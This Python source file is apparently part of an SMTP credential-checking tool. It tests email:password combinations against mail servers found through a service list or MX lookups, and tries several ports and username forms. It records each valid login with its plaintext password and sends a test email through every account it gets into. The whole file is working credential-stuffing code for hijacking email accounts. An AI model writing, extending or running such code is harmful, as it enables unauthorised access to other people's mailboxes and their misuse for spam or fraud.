import sys
import ssl
import smtplib
import json
from inc_testmail import mailer
from inc_etc import result
from inc_mxlookup import get_host

try:
    with open('inc_smtpports.json') as inc_smtpports:
        load_smtpports = json.load(inc_smtpports)
        smtp_ports = (load_smtpports['smtpports'])
    with open('inc_smtpservices.json') as inc_smtpservices:
        load_smtpservices = json.load(inc_smtpservices)
        smtp_services = (load_smtpservices['smtpservices'])
except:
    smtp_ports = []
    smtp_services = {}

# [FUNCTIONS]
# -----------

def smtpchecker(default_timeout, default_email, target):
    '''
    Main checker function (SMTP) including testmail sending in case a valid login is found.

    :param float default_timeout: connection timeout set by user
    :param str default_email: user email for sending testmail
    :param str target: emailpass combo to check
    :return: True (valid login), False (login not valid)
    '''
    try:
        sslcontext = ssl.create_default_context()
        output_hits = str('smtp_valid')
        output_checked = str('smtp_checked')
        output_testmail = str('smtp_testmessages')
        target_email = str('')
        target_user = str('')
        target_password = str('')
        target_host = str('')
        target_port = int(0)
        service_info = str('')
        service_found = False
        connection_ok = False
        checker_result = False
        email_sent = False
        global smtp_domains
        global smtp_ports
        global smtp_services
        new_target = str(str(target).replace('\n', ''))
        target_email, target_password = new_target.split(':')
        target_user = str(target_email)
        try:
            service_info = str(smtp_services[str(target_email.split('@')[1])])
            target_host = str(service_info.split(':')[0])
            target_port = int(service_info.split(':')[1])
            service_found = True
        except:
            pass
        if service_found == True:
            try:
                if int(target_port) == int(465):
                    smtp_connection = smtplib.SMTP_SSL(
                        host=str(target_host),
                        port=int(target_port),
                        timeout=default_timeout,
                        context=sslcontext
                    )
                    smtp_connection.ehlo()
                    connection_ok = True
                else:
                    smtp_connection = smtplib.SMTP(
                        host=str(target_host),
                        port=int(target_port),
                        timeout=default_timeout
                    )
                    smtp_connection.ehlo()
                    try:
                        smtp_connection.starttls(
                            context=sslcontext
                        )
                        smtp_connection.ehlo()
                    except:
                        pass
                    connection_ok = True
            except:
                pass
        if service_found == False or connection_ok == False:
            try:
                mx_result, found_host = get_host(default_timeout, target_email)
            except:
                mx_result = False
                found_host = str('')
            if mx_result == True:
                target_host = str(found_host)
                for next_port in smtp_ports:
                    try:
                        if int(next_port) == int(465):
                            smtp_connection = smtplib.SMTP_SSL(
                                host=str(target_host),
                                port=int(next_port),
                                timeout=default_timeout,
                                context=sslcontext
                            )
                            smtp_connection.ehlo()
                            target_port = int(next_port)
                            connection_ok = True
                        else:
                            smtp_connection = smtplib.SMTP(
                                host=str(target_host),
                                port=int(next_port),
                                timeout=default_timeout
                            )
                            smtp_connection.ehlo()
                            try:
                                smtp_connection.starttls(
                                    context=sslcontext
                                )
                                smtp_connection.ehlo()
                            except:
                                pass
                            target_port = int(next_port)
                            connection_ok = True
                        break
                    except:
                        continue
        if connection_ok == True:
            try:
                try:
                    smtp_connection.login(
                        user=str(target_user),
                        password=str(target_password)
                    )
                    checker_result = True
                except:
                    target_user = str(target_email.split('@')[0])
                    smtp_connection.login(
                        user=str(target_user),
                        password=str(target_password)
                    )
                    checker_result = True
                try:
                    smtp_connection.quit()
                except:
                    pass
                result_output = str(f'email={str(target_email)}, host={str(target_host)}:{str(target_port)}, login={str(target_user)}:{str(target_password)}')
                result(output_hits, result_output)
                result(output_checked, str(f'{new_target};result=login valid'))
                print(f'[VALID]    {result_output}')
            except:
                result(output_checked, str(f'{new_target};result=login failed'))
        else:
            result(output_checked, str(f'{new_target};result=no connection'))
        if checker_result == True:
            try:
                email_sent = mailer(
                    str(default_email),
                    str(target_email),
                    str(target_host),
                    int(target_port),
                    str(target_user),
                    str(target_password)
                )
                if email_sent == True:
                    result(output_testmail, str(f'{new_target};result=testmessage sent'))
                else:
                    result(output_testmail, str(f'{new_target};result=testmessage not sent'))
            except:
                result(output_testmail, str(f'{new_target};result=testmessage failed'))
            return True
        else:
            return False
    except:
        result(output_checked, str(f'{new_target};result=check failed'))
        return False

# DrPython3 (C) 2021 @ GitHub.com
